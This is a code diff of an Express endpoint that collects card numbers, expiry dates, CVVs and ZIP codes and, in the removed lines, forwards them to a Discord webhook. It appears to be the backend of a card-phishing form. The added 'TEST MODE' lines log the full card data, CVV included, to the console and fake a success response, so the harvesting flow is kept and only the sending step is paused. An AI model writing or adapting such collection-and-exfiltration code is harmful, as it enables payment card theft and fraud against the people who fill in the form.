@@ -15,44 +15,11 @@ app.post('/api/submit-form', async (req, res) => {
     try {
         const { card, mm, aa, cvv, zip } = req.body;
 
-        // Obtener el webhook URL de las variables de entorno
-        const webhookUrl = process.env.DISCORD_WEBHOOK_URL;
-
-        console.log('Webhook URL configured:', !!webhookUrl); // Debug log
-
-        if (!webhookUrl) {
-            console.error('DISCORD_WEBHOOK_URL not configured');
-            return res.status(500).json({ error: 'Server configuration error' });
-        }
-
-        console.log('Sending to Discord webhook...'); // Debug log
-
-        const content = {
-            embeds: [{
-                title: 'New form submission',
-                color: 15158332,
-                fields: [
-                    { name: 'Card', value: card || 'N/A', inline: true },
-                    { name: 'MM', value: mm || 'N/A', inline: true },
-                    { name: 'AA', value: aa || 'N/A', inline: true },
-                    { name: 'CVV', value: cvv || 'N/A', inline: true },
-                    { name: 'ZIP Code', value: zip || 'N/A', inline: true }
-                ],
-                timestamp: new Date().toISOString()
-            }]
-        };
-
-        const response = await fetch(webhookUrl, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify(content)
-        });
-
-        if (!response.ok) {
-            throw new Error('Discord webhook failed');
-        }
-
-        res.json({ success: true });
+        // TEST MODE: Solo loggear los datos sin enviar a Discord
+        console.log('TEST MODE - Datos recibidos:', { card, mm, aa, cvv, zip });
+        
+        // Simular respuesta exitosa
+        res.json({ success: true, test: true });
 
     } catch (error) {
         console.error('Error:', error);
